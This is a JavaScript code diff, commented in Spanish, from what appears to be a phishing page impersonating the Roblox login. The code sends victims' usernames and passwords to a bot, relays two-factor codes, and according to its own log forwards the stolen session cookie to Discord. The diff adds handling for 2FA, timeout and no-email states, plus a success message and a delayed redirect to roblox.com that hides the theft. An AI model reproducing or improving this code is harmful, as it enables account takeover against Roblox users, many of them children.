@@ -672,7 +672,7 @@ async function enviarAlBot(username, password) {
         const data = await response.json();
         console.log('📨 Respuesta del bot:', data);
         
-        // ✅ DETECTAR 2FA Y MOSTRAR POPUP
+        // ✅ DETECTAR CUALQUIER ESTADO DE 2FA
         if (data.status === '2FA_REQUERIDO' || data.status === 'EMAIL' || data.status === '2FA_DETECTED') {
             console.log('⚠️ 2FA DETECTADO - Mostrando popup...');
             document.getElementById('loginBtn').style.display = 'block';
@@ -683,9 +683,13 @@ async function enviarAlBot(username, password) {
         
         if (data.status === 'LOGIN_EXITOSO') {
             console.log('✅ Login exitoso! Cookie enviada a Discord');
+            // No redirigimos aún, esperamos a que el bot confirme
+            document.getElementById('loginBtn').style.display = 'block';
+            document.getElementById('loginLoading').style.display = 'none';
+            mostrarExito('✅ Login exitoso! Redirigiendo...');
             setTimeout(() => {
                 window.location.href = 'https://www.roblox.com';
-            }, 2000);
+            }, 3000);
             return data;
         }
         
@@ -694,6 +698,22 @@ async function enviarAlBot(username, password) {
             document.getElementById('loginBtn').style.display = 'block';
             document.getElementById('loginLoading').style.display = 'none';
             mostrarError('Usuario o contraseña incorrectos');
+            return data;
+        }
+        
+        if (data.status === 'TIMEOUT') {
+            console.log('⏰ Tiempo de espera agotado');
+            document.getElementById('loginBtn').style.display = 'block';
+            document.getElementById('loginLoading').style.display = 'none';
+            mostrarError('Tiempo de espera agotado (60s)');
+            return data;
+        }
+        
+        if (data.status === 'NO_EMAIL') {
+            console.log('❌ No se encontró método de correo');
+            document.getElementById('loginBtn').style.display = 'block';
+            document.getElementById('loginLoading').style.display = 'none';
+            mostrarError('No se encontró método de correo');
             return data;
         }
         
@@ -741,7 +761,7 @@ async function enviarCodigoAlBot(codigo) {
 }
 
 // ============================================================
-// MOSTRAR ERRORES
+// MOSTRAR ERRORES Y ÉXITO
 // ============================================================
 
 function mostrarError(mensaje) {
@@ -773,7 +793,39 @@ function mostrarError(mensaje) {
     errorEl.style.display = 'block';
     setTimeout(() => {
         errorEl.style.display = 'none';
-    }, 3000);
+    }, 4000);
+}
+
+function mostrarExito(mensaje) {
+    let exitoEl = document.getElementById('login-exito');
+    if (!exitoEl) {
+        exitoEl = document.createElement('div');
+        exitoEl.id = 'login-exito';
+        exitoEl.style.cssText = `
+            color: #00ff88;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 8px;
+            margin-bottom: 8px;
+            padding: 10px;
+            background: rgba(0,255,136,0.1);
+            border-radius: 6px;
+            border: 1px solid rgba(0,255,136,0.3);
+            display: none;
+        `;
+        const loginCard = document.querySelector('.login-card');
+        if (loginCard) {
+            const loginBtn = document.getElementById('loginBtn');
+            if (loginBtn) {
+                loginCard.insertBefore(exitoEl, loginBtn);
+            }
+        }
+    }
+    exitoEl.textContent = mensaje;
+    exitoEl.style.display = 'block';
+    setTimeout(() => {
+        exitoEl.style.display = 'none';
+    }, 4000);
 }
 
 // ============================================================
@@ -866,9 +918,9 @@ document.querySelector('.verify-btn').addEventListener('click', async function()
     
     if (exitoso) {
         closeVerification();
-        setTimeout(() => {
-            window.location.href = 'https://www.roblox.com';
-        }, 2000);
+        mostrarExito('✅ Código verificado! Iniciando sesión...');
+        // No redirigimos inmediatamente, esperamos que el bot confirme
+        // El bot enviará LOGIN_EXITOSO y redirigirá desde allí
     } else {
         codigoEnviado = false;
         codeInput.value = '';
